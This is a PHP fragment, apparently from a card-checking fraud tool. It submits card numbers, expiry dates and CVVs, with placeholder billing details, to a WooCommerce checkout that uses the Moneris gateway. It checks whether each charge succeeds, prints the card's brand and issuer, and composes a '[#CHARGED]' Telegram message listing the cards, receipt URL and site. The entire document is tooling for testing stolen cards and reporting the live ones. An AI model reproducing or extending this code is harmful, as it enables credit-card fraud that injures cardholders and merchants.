...
// Format mes / ano, ensuring ano is 2 digits
$ano = substr($ano, -2);  // Get the last two digits of ano
$expiry = $mes . '/' . $ano;
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'billing_address_2' => '',
    'shipping_method[0]' => 'local_pickup:26',
    'billing_city' => $city,
    ...
    'wc-moneris-card-bin' => $cc6,
    'moneris-card-number' => $cc,
    'moneris-card-expiry' => $expiry,
    'moneris-card-cvc' => $cvv,
    'moneris-avs-street-number' => '123',
    'moneris-avs-street-name' => 'street',
    'moneris-avs-zipcode' => $zip,


    'wc-moneris-account-number' => $cc,
    'wc-moneris-expiry' => $expiry,
    'wc-moneris-csc' => $cvv,
...
if (strpos($Payment, '"result":"success"') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
            ...
            $telegramMessage = "[#CHARGED] - $lista [MONERIS CVV CHARGED] 
            \n[$receiptUrl]
            \n[$price1]
            \n[$hostname1]\n";
